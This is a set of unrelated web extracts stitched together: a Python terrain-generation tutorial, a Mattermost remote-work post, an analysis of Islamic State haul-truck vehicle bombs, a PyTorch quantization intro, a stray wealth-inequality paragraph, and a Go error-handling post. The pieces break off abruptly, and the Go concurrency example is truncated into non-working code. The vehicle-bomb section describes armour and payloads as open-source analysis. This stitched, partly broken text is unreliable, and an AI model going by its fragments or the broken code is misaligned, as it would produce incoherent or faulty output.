<p>The above code snippet generates intermediate points using Linear Interpolation but we can very easily change the interpolation function to Cosine Interpolation and see the effect in action. The sampling and interpolating on a naively generated terrain for different values of sample is as shown below</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99227920-e7983880-2811-11eb-9c79-bed5cad2eed3.png" alt="https://user-images.githubusercontent.com/4745789/99227920-e7983880-2811-11eb-9c79-bed5cad2eed3.png"></p>
<p>For each interpolation, the 5 plots shown above are sampled for every <code>1</code>, <code>2</code>, <code>3</code>, <code>4</code>, and <code>5</code> points respectively. We can clearly see the plots of Cosine Interpolation are much smoother than Linear Interpolated ones. The technique does a good job over naive implementation but it still does not mimic what we see in the real world. To make things as close to the real-world as possible we use the concept of <a href="https://en.wikipedia.org/wiki/Superposition_principle">Superposition</a>.</p>

<p>Sampling and Interpolation are effective in reducing the spikes and making transitions gradual. The concern with this approach is that sudden changes are not really gone. In order to address this situation, we use the principle of Superposition upon multiple such sampled terrains.</p>
<p>The approach we take here is to generate <code>k</code> such terrains with different sampling frequencies and then perform a normalized weighted sum. This way we get the best of both worlds i.e smoothness from the terrain with the least sampled points and aberrations from the one with the most sampled points.</p>
<p>Now the only piece that remains is choosing the weights. The weights and sampling frequency varies by the power of <code>2</code>. The number of terrains to be sampled depends on the kind of terrain needed and is to be left for experimentation, but we can assume it to be 6 for most use cases.</p>
<p>The terrain that samples all the points should be given the least weight as it aims to contribute sudden spikes; and as we increase the sampling frequency by the power of <code>2</code> we increase the weight by the power of <code>2</code> as well. Hence for the first terrain, the scale is <code>0.03125</code> where were sample all the points <code>256</code>, the next terrain is sampled with <code>128</code> points and has a scale of <code>0.0625</code>, and so on till we reach sampled points to be <code>8</code> with scale as <code>1</code>, giving it the highest weight.</p>
<p>Once these terrains are generated we perform a normalized weighted sum and generate the final terrain as shown in the illustration below.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99264852-0107a780-2847-11eb-9bd1-2e2994c56028.png" alt="https://user-images.githubusercontent.com/4745789/99264852-0107a780-2847-11eb-9bd1-2e2994c56028.png"></p>
<p>The illustration above shows 6 scaled sampled terrains with different sampling frequencies along with the final super-positioned terrain generated from the procedure. It is very clear that the terrain generated using this procedure is much more closer to the real world terrain than any other we have seen before. Python code that generated the above terrain is as below</p>
<pre><code><span><span>def</span> <span>terrain_superpos_linp</span><span>(naive_terrain, iterations=<span>8</span>)</span> -&gt; List[float]:</span>
    <span>"""Using naive terrain `naive_terrain` the function generates
    Linearly Interpolated Superpositioned terrain that looks real world like.
    """</span>
    terrains = []

    
    weight_sum = <span>0</span>

    
    <span>for</span> z <span>in</span> range(iterations, <span>0</span>, <span>-1</span>):
        terrain = []

        
        weight = <span>1</span> / (<span>2</span> ** (z - <span>1</span>))

        
        
        sample = <span>1</span> &lt;&lt; (iterations - z)

        
        sample_points = naive_terrain[::sample]
        
        weight_sum += weight

        <span>for</span> i <span>in</span> range(len(sample_points)):

            
            terrain.append(weight * sample_points[i])

            
            
            <span>for</span> j <span>in</span> range(sample - <span>1</span>):
                
                mu = (j + <span>1</span>) / sample

                
                a = sample_points[i]
                b = sample_points[(i + <span>1</span>) % len(sample_points)]
                v = linp(a, b, mu)

                
                terrain.append(weight * v)

        
        
        terrains.append(terrain)

    
    
    <span>return</span> [sum(x)/weight_sum <span>for</span> x <span>in</span> zip(*terrains)]
</code></pre>
<p>If the terrain to be generated is needed to be smoother then instead of using Linear Interpolation switch to Cosine Interpolation and the resultant terrain will be much smoother and curvier as seen in the illustration below.</p>

We became addicted to our ability to source really great talent from anywhere in the world, and addicted to the productivity of not having to worry about the overhead of an office, the time wasted commuting every day, or the frustration of having to find a space to meet up.</p><figure id="attachment_11249" aria-describedby="caption-attachment-11249"><a href="https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-scaled.jpg" data-size="{&quot;w&quot;:1920,&quot;h&quot;:1280}"><img loading="lazy" src="https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-scaled.jpg" alt="The Mattermost team" width="2560" height="640" srcset="https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-scaled.jpg 2560w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-300x75.jpg 300w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-1024x256.jpg 1024w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-768x192.jpg 768w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-1536x384.jpg 1536w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-2048x512.jpg 2048w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-716x179.jpg 716w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-820x205.jpg 820w" sizes="(max-width: 2560px) 100vw, 2560px"></a><figcaption id="caption-attachment-11249">The Mattermost team</figcaption></figure><p>That isn’t to say scaling a remote team has been easy. We’ve learned a lot about what makes for a great remote experience. Here are a few of the lessons learned about the challenges of remote work, and how we make it work for our team.</p><h2><strong>Pair design helps remote collaboration run smoothly</strong></h2><p>One of the superpowers of a remote team is <a href="https://about.gitlab.com/company/culture/all-remote/asynchronous/">embracing the ability to work asynchronously</a>. Unfortunately, this can also make large group collaboration more challenging. There are certain problems you might want a relatively large group to work together — for example, planning our annual onsite. In an office setting, you’d just get those four or five or seven people together camped out in a conference room for a whole week, knocking out the problem. But it can be particularly challenging to wrangle a large group of people to carve out a long chunk of time to work together remotely. Everyone has other priorities they’re trying to juggle.</p><p>We’ve found what works best for remote collaboration is keeping the collaboration smaller. We try to apply <a href="https://uxdesign.cc/benefits-of-design-pairing-2a3ceb0bdfac?gi=df46f7c04818">pair design</a> practices wherever we can; if you can break down and prioritize bigger problems into smaller problems two people can tackle, they can work through the problem, talk through it, and agree on it. Then, when they come back to a broader group, they come in with a much more polished solution and it’s easier to get an idea implemented.</p><h2><strong>Documentation is the secret to great onboarding and culture building</strong></h2><p>There’s a bit of a misconception that companies can only build stronger cultures in-person versus remote. I would say culture is stronger when everything is written down because everyone who joins the company has the same baseline: a consistent onboarding experience and documentation as the shared source of truth.</p><p>Remote onboarding done right can be far more scalable, efficient, and impactful. We get a good deal of positive feedback for our onboarding process at Mattermost because <a href="https://handbook.mattermost.com/operations/workplace/people/working-at-mattermost/onboarding">everything is documented</a>. In-office onboarding experiences are usually a series of person-to-person interactions that mete out information bit by bit — you might talk to 18 different people throughout the day, each with a different piece of the organizational puzzle. When you’re a remote company, onboarding is a lot more focused on reading through information.</p><p>Don’t get me wrong — new hires at Mattermost still talk to a lot of people in their first few weeks —&nbsp;but the interactions they have are more meaningful because they’ve gotten all the administrative stuff out of the way. New hires can get up to speed on the history and context of ongoing projects and initiatives when they join and can start asking much higher quality, deep questions during those first interactions.</p><h2><strong>To find great remote employees, prioritize candidates with strong writing skills</strong></h2><p>One thing that’s become even more clear during the pandemic: there are people who really like working remote and thrive in a remote work environment, but it’s not for everyone. Right now everyone needs to work remotely. While many people have realized working from home is amazing — they love not having to commute, they love the independence, the flexibility — there are others who really miss the office environment.</p><p>One of the biggest indicators that we’ve found around who thrives in a remote environment is strong written communication skills. If you’re a strong writer and you can consume information in written formats really well, you’ll probably have an easier time transitioning to a remote team than someone who prefers face-to-face communication.</p><h2><strong>Want to join Mattermost’s remote-first team?</strong></h2><p>Mattermost is on a mission to connect the world with what matters most, and we’re continually looking for people to help us achieve that goal —&nbsp;no matter where in the world they live.&nbsp;To learn more about what it’s like to work at Mattermost and to see our current open roles, check out our <a href="https://mattermost.com/careers/">Careers page</a>.</p></div></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article aria-label="Mining Haul Trucks – The Largest SVBIEDs In The World"><div><p><span>The SVBIEDs used by the Islamic State (IS) throughout the years have come in all different sizes. Everything from sedans, to pick-up trucks, heavy transport trucks, heavy construction equipment, and military armoured vehicles have been converted into rolling bombs. While large shell vehicles have been relatively common, there’s one rare category of vehicles completely unmatched both in its absurd size and obscurity <span>— t</span>he mining haul trucks. There has only been 3 recorded cases of IS using this vehicle type in SVBIED attacks, ever.&nbsp;In this article I will be detailing all available information about these attacks, beginning with the first example in August, 2015.</span></p>
<p><span><strong>No. 1 — Homs province, Syria (August, 2015)</strong></span></p>
<p><span>In late May 2015, IS managed to <a href="https://www.telegraph.co.uk/news/worldnews/middleeast/syria/11633289/Isil-seizes-Syrian-regimes-lucrative-phosphate-mines.html">seize the strategic town of Khunayfis</a>, located approximately 60 kilometres to the Southwest of Palmyra in the central Syrian desert of Homs province. Along with the town, IS militants also seized the Khunayfis phosphate mine. The mine is one of two in the area, with the other one located at al-Sharqiyah/as-Sawwanah. In a photo released by IS from the Sawwanah facility which was also captured around the same time,&nbsp;at least 6 <a href="https://belsat.eu/en/news/isis-militants-have-worlds-biggest-armored-cars-made-belarusian-belaz-dump-trucks/">Belarusian-made Belaz&nbsp;haul trucks</a> could be seen lined up. These massive vehicles are traditionally employed in large mining operations, but IS would find a much more destructive use for them.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Khunayfis-phosphate-mine-near-palmyra_lateMay2015.jpg" alt="" width="980" height="619" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Khunayfis-phosphate-mine-near-palmyra_lateMay2015.jpg 980w, https://hugokaaman.com/wp-content/uploads/2019/03/Khunayfis-phosphate-mine-near-palmyra_lateMay2015-300x189.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Khunayfis-phosphate-mine-near-palmyra_lateMay2015-768x485.jpg 768w" sizes="(max-width: 980px) 100vw, 980px">In the spirit of experimentation and not letting anything go to waste, IS decided to move one of these Belaz haul trucks to one of their workshops near the town of al-Qaryatayn, where it would be overhauled to function as an SVBIED. It’s unclear whether the chosen haul truck was taken from Khunayfis or al-Sharqiyah/as-Sawwanah. A photo taken during the manufacturing process showed that the massive vehicle had been plastered with a primary layer of improvised frontal armour in the form of metal sheets, and a secondary layer of improvised slat armour on top. At the time of the photo, the driver’s cabin had not yet been up-armoured.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.25.04.jpg" alt="" width="444" height="734" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.25.04.jpg 444w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.25.04-181x300.jpg 181w" sizes="(max-width: 444px) 100vw, 444px">On August 19th 2015, the finished haul truck SVBIED was featured in an official IS photo report. With the addition of improvised metal sheets, armoured glass, as well as slat armour to the driver’s cabin, the vehicle was ready to depart on its mission.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.42.jpg" alt="" width="1021" height="575" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.42.jpg 1021w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.42-300x169.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.42-768x433.jpg 768w" sizes="(max-width: 1021px) 100vw, 1021px">In one of the photos, the driver of the SVBIED&nbsp;(“Abu Abdullah al-Ansari”) could be seen posing in front of the haul truck.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.29.jpg" alt="" width="1023" height="575" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.29.jpg 1023w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.29-300x169.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.24.29-768x432.jpg 768w" sizes="(max-width: 1023px) 100vw, 1023px">According to IS themselves, the haul truck had been fitted with a hefty explosive payload weighing in at 8 tons. The chosen target for this monstrous SVBIED was the Syrian loyalist-controlled Mafraq checkpoint, located Northeast of al-Qaryatayn. Although the operation itself wasn’t shown in a video, a distant night vision photograph of the detonation was included in the photo report.</span></p>

<p><span><strong>No. 2 — Anbar province, Iraq (January, 2017)</strong></span></p>
<p><span>In late January 2017, an Iraqi fighter uploaded a remarkable <a href="https://twitter.com/HKaaman/status/825804781352529920">video</a>. The 2-minute long video, shot somewhere in Iraq’s Anbar desert, featured the second recorded example of a Belaz haul truck converted into an up-armoured SVBIED.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34.jpg" alt="" width="1273" height="710" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34.jpg 1273w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34-300x167.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34-768x428.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.34-1024x571.jpg 1024w" sizes="(max-width: 1273px) 100vw, 1273px">The frontal armour mounted on this haul truck appeared a lot more reserved and inconspicuous than that of its predecessor. Instead of applying a wall of metal sheets to the front, smaller sections had been mounted to key areas. For example, a large centre piece metal sheet shielded the engine. The slats in the sheet were purposely designed to prevent the engine from overheating. A smaller piece of improvised armour was also mounted in front of the&nbsp;right-side set of frontal wheels. The driver’s cabin was the most heavily shielded, with large metal sheets and armoured glass protecting the driver. This change in armour placement is actually fairly logical. The engine, driver’s cabin, and wheels are the weakest points on the haul truck. Hence, most of the work put in to overhaul the vehicle focused on these 3 crucial areas. However, seeing as this haul truck SVBIED was captured before it could be employed in battle, it’s unclear whether more armour additions were intended. a smaller piece of improvised armour mounted in front of he left-side set of frontal wheels seem to be the only component missing though.<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50.jpg" alt="" width="1277" height="714" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50.jpg 1277w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50-300x168.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50-768x429.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.38.50-1024x573.jpg 1024w" sizes="(max-width: 1277px) 100vw, 1277px">The overhauled haul truck was found parked at the lower end of a ramp leading into a large desert dug-out. Looking at the vehicle from inside the underground storage facility, it appeared far more imposing.</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18.jpg" alt="" width="1273" height="714" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18.jpg 1273w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18-300x168.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18-768x431.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.40.18-1024x574.jpg 1024w" sizes="(max-width: 1273px) 100vw, 1273px">The video also included a short look at the rather large explosive payload. The payload consisted of a series of explosive-filled jugs, barrels and gas tanks wired together. Taking into account the size of the rear bed of the haul truck, there was likely more than one layer of IEDs. However, the top layer alone was quite impressive. I estimate the top layer alone consisting of at least 30 large jugs (blue), around 100 smaller jugs (white/yellow/red/green), and 3 gas tanks. Seeing as we don’t know exactly how much explosives were contained in each jug, it’s &nbsp;difficult to get a precise estimate of the weight of the payload.</span></p>

More than 100 standardised pressure plate IEDs were discovered at this specific site.&nbsp;</span></p>

The video itself didn’t provide specifics as to where the SVBIED was seized other than it being in Anbar province. However, there are a number of large mining operations in Anbar province previously under IS control where it could have been taken from originally, including the <a href="https://en.wikipedia.org/wiki/Akashat">Akashat</a> facility.</span></p>
<p><span><strong>No. 3 — Nineveh province, Iraq (May, 2017)</strong></span></p>
<p><span>As the battle for Western Mosul entered its final stages in May 2017, the remaining IS contingent put up a fierce defence. In an official video released by IS in mid-May 2017, the third and final example of an up-armoured haul truck SVBIED was featured along with a series of other standardised SVBIEDs.&nbsp;</span></p>
<p><span><img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27.jpg" alt="" width="1262" height="706" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27.jpg 1262w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27-300x168.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27-768x430.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.51.27-1024x573.jpg 1024w" sizes="(max-width: 1262px) 100vw, 1262px">The armour placement on this example was noticeably more refined and all-encompassing compared to the previous two examples. A series of inter-connected metal plates covered the entire front of the vehicle. Angled armour with air intakes shielded the engine, and a piece of armoured glass acted as a viewing port for the driver as per usual. Furthermore, both sides of the original rear bed had been removed in favour of an improvised metal sheet. This example was also the first to have been fitted with rear armour shielding the rear wheel sets from incoming fire.</span></p>
<p><span>Identical writings in Arabic on both the frontal armour above the driver’s viewing port and on the rear bed side armour could be roughly translated into “B150”&nbsp;<span><strong>—</strong>&nbsp;a unique identifying serial number.</span></span></p>

The video that this example was featured in actually featured very short snippets of the interior, offering a clue as to how it was set up. In the first section, an IS fighter could be seen climbing up into the vehicle.<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17.jpg" alt="" width="1257" height="706" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17.jpg 1257w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17-300x168.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17-768x431.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.17-1024x575.jpg 1024w" sizes="(max-width: 1257px) 100vw, 1257px">A look at the driver’s seat showed the armoured glass from the inside, and also provided a glimpse of the white box detonation mechanism mounted next to the steering wheel on the right,<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54.jpg" alt="" width="1260" height="710" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54.jpg 1260w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54-300x169.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54-768x433.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-22-at-10.49.54-1024x577.jpg 1024w" sizes="(max-width: 1260px) 100vw, 1260px">The gunner of this 2-man SVBIED was positioned in the next room, protected by improvised metal armour on all sides. According to <a href="https://twitter.com/calibreobscura?lang=en">Calibre Obscura</a>, an expert on identifying small arms, the primary armament was a Chinese-made 12.7mm <a href="https://en.wikipedia.org/wiki/W85_heavy_machine_gun">W85</a> heavy machine gun fixed on what looked like an improvised pintle mount. The secondary armaments included both a Soviet <a href="https://en.wikipedia.org/wiki/PK_machine_gun">PK</a> machine gun, as well as what appeared to be a Bulgarian AK-type rifle.<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07.jpg" alt="" width="1271" height="714" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07.jpg 1271w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07-300x169.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07-768x431.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-25-at-13.37.07-1024x575.jpg 1024w" sizes="(max-width: 1271px) 100vw, 1271px">Now, where did IS source this vehicle from? It definitely wasn’t transported all the way from Anbar province. Conveniently enough, the previously IS-controlled Badush cement plant, located approximately 20 kilometres Northwest of W. Mosul operated multiple Belaz haul trucks. When the Iraqi army recaptured the cement plant in June 2017, what remained of the facility and its vehicles was documented in a <a href="https://www.youtube.com/watch?v=7WytqV_x7c4">video</a> by al-Mawsliya TV. The “B” in the identifying serial number of this example (“B150”) may also have been a reference to its origin, the Badush plant.<img loading="lazy" src="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45.jpg" alt="" width="1139" height="594" srcset="https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45.jpg 1139w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45-300x156.jpg 300w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45-768x401.jpg 768w, https://hugokaaman.com/wp-content/uploads/2019/03/Screenshot-2019-03-24-at-20.18.45-1024x534.jpg 1024w" sizes="(max-width: 1139px) 100vw, 1139px"></span></p>
<p><span><strong>Efficient use, or Propaganda?</strong></span></p>
<p><span>The real question here is whether using gigantic haul trucks as SVBIED shells serves a purpose other than an aesthetic one. Because, let’s face it&nbsp;– The ones that have been recorded really do look impressive. Looking beyond that, the efficiency of using this type of SVBIED is very questionable.</span></p>
<p><span>Firstly, it doesn’t really make sense to use such a massive shell vehicle as a vessel to carry explosives. When you have a smaller shell vehicle, such as a pick-up truck or even a heavy truck, the vehicle itself acts as more shrapnel and debris upon detonation. However, the bigger and heavier the shell vehicle is, the more explosives is required in order to render it a viable option. For example, mining haul trucks weigh in at around 45 tons, an absurd weight. When you use it as an SVBIED, the frame of the vehicle will absorb a lot of the explosive energy of the payload upon detonation. And while IS claimed that the first haul truck SVBIED had an explosive payload of 8 tons, it’s not really that much when you account for the weight of the haul truck itself and the explosives required to tear it apart.</span></p>
<p><span>The comparatively smaller category of heavy trucks can still carry payloads of the same weight class, and they don’t carry with them the problem of the frame of the vehicle itself being too large. In this aspect, there’s no logic at all to using haul trucks.</span></p>
<p><span>The large size and weight of the haul trucks presents another issue as well. Their slow speed, combined with their large profile, means that they’ll be large targets advancing toward their targets slowly. This means that the opposing force will have a lot more time to fire on a much larger target than …</span></p></div></article></div>

      <h3 id="introduction">Introduction</h3>

<p>Dynamic quantization quantize the weights of neural networks to integers, but the activations are dynamically quantized during inference. Comparing to floating point neural networks, the size of dynamic quantized model is much smaller since the weights are stored as low-bitwidth integers. Comparing to other quantization techniques, dynamic quantization does not require any data for calibration or fine-tuning. More details about the mathematical foundations of quantization for neural networks could be found in my article <a href="https://leimao.github.io/article/Neural-Networks-Quantization/">“Quantization for Neural Networks”</a>.</p>



<p>Given a pre-trained floating point model, we could easily create an dynamically quantized model, run inference, and potentially achieve better latency without too much additional effort. In this blog post, I would like to show how to use PyTorch to do dynamic quantizations.</p>

<h3 id="pytorch-dynamic-quantization">PyTorch Dynamic Quantization</h3>

<p>Unlike TensorFlow 2.3.0 which supports integer quantization using arbitrary bitwidth from 2 to 16, PyTorch 1.7.0 only supports 8-bit integer quantization. The workflow is as easy as loading a pre-trained floating point model and apply a dynamic quantization wrapper.</p>



<p>In this case, I would like to use the BERT-QA model from HuggingFace Transformers as an example. I was dynamically quantizing the <code>torch.nn.Linear</code> layer for the BERT-QA model since the majority of the computation for Transformer based models are matrix multiplications.</p>

<p>With PyTorch 1.7.0, we could do dynamic quantization using x86-64 and aarch64 CPUs. However, NVIDIA GPUs have not been supported for PyTorch dynamic quantization yet.</p>

According to PolitiFact the top 400 richest Americans "have more wealth than half of all Americans combined." According to the New York Times on July 22, 2014, the "richest 1 percent in the United States now own more wealth than the bottom 90 percent". Inherited wealth may help explain why many Americans who have become rich may have had a "substantial head start". In September 2012, according to the Institute for Policy Studies, "over 60 percent" of the Forbes richest 400 Americans "grew up in substantial privilege".

<p>We could see that the model size of the INT8 quantized model is much smaller than the FP32 model. The inference latency of INT8 dynamic quantization on CPU is much faster than the FP32 ordinary inference on CPU. However, FP32 inference using NVIDIA GPU is still the fastest.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>When <a href="https://www.dolthub.com/team#tim">Tim</a>, <a href="https://www.dolthub.com/team#aaron">Aaron</a>, and <a href="https://www.dolthub.com/team#brian">I</a>
started working on this problem in August 2018 we immediately began playing with <a href="https://github.com/attic-labs/noms">Noms</a>.
It was an open source project that gave us a lot of the things Aaron and I had been talking about in order to deliver the
features we felt were critical to our success.  Noms gave us the ability to efficiently diff across commits, and
merge commits.  Though Noms had become an inactive project, we felt it would tremendously improve our go to market
time to use it as our storage layer, so we decided it was worth diving deeper.</p>
<p>I built a demo of a command line tool that used the Git commands people already know in order to
version structured table data.  As we played with the demo, we felt like we were on to something, and
decided to really go after the "Git for Data" product that is <a href="https://doltdb.com/">Dolt</a> today. After additional
investment in delivering a fully featured Git-like command line we began to think about <a href="https://dolthub.com/">DoltHub</a>,
a place for our users to find, collaborate on, and store data projects. This was the first time we needed to access
data stored using Noms on backend servers, and it was at this time we discovered issues with how Noms handled errors.</p>

<p>I'm not going to go into detail on the language design decisions behind Go's panics and errors.  If you would like that
background before going further I'd take a look at <a href="https://eli.thegreenplace.net/2018/on-the-uses-and-misuses-of-panics-in-go/">this article</a>
which covers it in depth.  However, a nasty problem with panics is that a panic without a deferred recover on any go routine
will crash your program.  If you are writing a server handling many concurrent requests, any panic that escapes on any
go routine will cause every single one of the concurrently executing requests to fail.  All those connections will be
closed, and the server will restart. In a sufficiently complicated server where go routines handling requests
spawn additional go routines and use <a href="https://levelup.gitconnected.com/communicating-sequential-processes-csp-for-go-developer-in-a-nutshell-866795eb879d">CSP</a>
to do work, using panics for flow control is a recipe for disaster. With so much invested in using Noms, we decided to
"hard fork" the project and eliminate the heavy use of panics.</p>

<p>The process of eliminating panics started out pretty straight forward.  Search the codebase for a panic, change the
signature of the method to return an error, and replace the panic.  Then find all the call sites where the method
and handle the error, or return it up the callstack.  I thought I'd be able to migrate from panics to errors
in about a week.  Boy was I wrong.</p>

<p>As soon as I realized that Noms could panic when calculating the hash of its types I knew I was way off. In the
end I think I spent closer to 6 weeks on this.  It was time-consuming, and boring, but it couldn't be automated and every
one of the changes was an opportunity to introduce bugs.  Today, searching the updated Noms codebase for <code>if err != nil</code>
returns 1370 results, and I'm guessing more than half of those were introduced while removing panics. It effected hundreds
of function signatures.  Because Noms lies below our main application's code, the changes bubble up to all the code which
depends on Noms directly and indirectly. </p>

<p>GO advocates for using CSP in order to write concurrent code.  New go routines are spawned in order to do parallel processing
and channels are used to communicate between go routines.  It was in these cases where panics were causing the biggest problems,
and they were the more interesting cases to talk about when converting panics to errors, as converting these improperly
can introduce deadlocks.</p>
<p>Lets start by defining a simple function we want to run concurrently:</p>
<div data-language="go"><pre><code><span>func</span> <span>process</span><span>(</span>ctx context<span>.</span>Context<span>,</span> workCh <span>chan</span> WorkItem<span>,</span> resCh <span>chan</span> WorkItemResult<span>)</span> <span>error</span> <span>{</span>
    <span>for</span> workItem <span>:=</span> <span>range</span> workCh <span>{</span>
        res<span>,</span> err <span>:=</span> <span>doWork</span><span>(</span>workItem<span>)</span>

        <span>if</span> err <span>!=</span> <span>nil</span> <span>{</span>
            <span>return</span> err
        <span>}</span>       

        resCh <span>&lt;-</span> res
    <span>}</span>

    <span>return</span> <span>nil</span>
<span>}</span></code></pre></div>
<p>The function takes a channel that it reads work items from, and a channel that it writes results to.  In the event that
an error is encountered the function returns the error. A straightforward, but erroneous way to handle this would be:</p>
<div data-language="go"><pre><code><span>func</span> <span>myConcurrentFunc</span><span>(</span>ctx context<span>.</span>Context<span>,</span> workItems WorkItem<span>)</span> <span>(</span><span>[</span><span>]</span>WorkItemResult<span>,</span> <span>error</span><span>)</span> <span>{</span>

        workItemResults <span>=</span> <span>append</span><span>(</span>workItemResults<span>,</span> result<span>)</span>
    <span>}</span>
    
    <span>return</span> workItemResults<span>,</span> <span>nil</span>
<span>}</span></code></pre></div>
<p>The first problem here, is that the <code>err</code> instance is modified and read in an unsafe manner.  This can be resolved using
a mutex or Go's atomic primitives, and this is a simplified version of how I handled these errors in many cases. I created
a class <code>AtomicError</code> that made these types of operations thread safe, but this example still has other issues. </p>
<p>If <code>process()</code> errors on one of the go routines, all the other ones will continue running until they all error, or
all the work items have been completed despite not having any impact (No matter what happens we are going to <code>return nil, err</code>).
Depending on the use, maybe this behavior is acceptable, but in cases where the operation takes a long time, this does not
work.  This can be fixed by testing the state of the atomic error in the <code>process</code> loop but it can make the code pretty ugly. </p>
<p>Another suboptimal characteristic of this code is that you need to create the channels with buffers
large enough to hold every work item, and result.  It is possible to avoid this also, but it involves additional synchronization
in order to close the result channel just a single time when an error is encountered, or when all work is done and the last
go processing routine exits.  </p>
<p>Finally, when we are talking about this being run on a server as a part of a request, there is the very real possibility
that the request may get cancelled for some reason, such as exceeding some pre-defined deadline.  In order to handle this
and the other errors in a cleaner way I wish I had known about <a href="https://godoc.org/golang.org/x/sync/errgroup">errgroup</a>.</p>

<p>errgroup is an extremely simple package with just <a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go">a single small file</a>.
It uses the <code>context.Context</code> that is used throughout Golang to implement <code>errgroup.Group</code> which will update the context
if any one of them returns an error. Our updated code looks like this:</p>
